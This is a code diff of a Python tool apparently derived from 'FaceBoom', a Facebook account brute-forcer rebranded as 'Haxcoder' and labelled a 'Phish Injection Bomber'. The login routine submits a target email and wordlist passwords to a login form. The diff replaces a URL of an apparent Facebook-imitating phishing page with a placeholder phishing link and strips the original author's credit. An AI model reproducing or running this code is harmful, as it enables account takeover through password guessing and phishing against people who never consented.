@@ -84,7 +84,7 @@ class FaceBoom(object):
     def login(self,target, password):
 
         try:
-            self.br.open("https://news-daily.000webhostapp.com/m-facebook-com/sample/")
+            self.br.open("https:phishinglink.here")
             self.br.select_form(nr=0)
             self.br.form['email']=target
             self.br.form['pass']= password
@@ -108,11 +108,11 @@ class FaceBoom(object):
 ==================================
 [---]        """+wi+"""Haxcoder"""+gr+"""        [---]
 ==================================
-[---]  """+wi+"""Phish Brute Injection"""+gr+""" [---]
+[---]  """+wi+"""Phish Injection Bomber"""+gr+""" [---]
 ==================================
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
-[>] Target      :> """+wi+target+gr+"""
+[>] Message From      :> """+wi+target+gr+"""
 {}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+wi)
         if not single_passwd:
@@ -151,11 +151,11 @@ Usage: python ./haxcoder.py [OPTIONS...]
 OPTIONS:
        |
     |--------
-    | -t <target email>     ::> Specify target Email [OR] Target Profile ID
+    | -t <Message From>     ::> Message or Name of the bomber
     |--------
     | -w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
-    | -u/--update                             ::> Update Haxcoder Script
+ 
 -----------------------------------------------------------------------------
 """)
 
@@ -255,6 +255,6 @@ if __name__=='__main__':
 #####################   END OF TOOL  #########################
 #####################                #########################
 ##############################################################
-#This Tool by Oseid Aldary
+#This Tool is modified by Haxcoder
 #Have a nice day :)
 #GoodBye
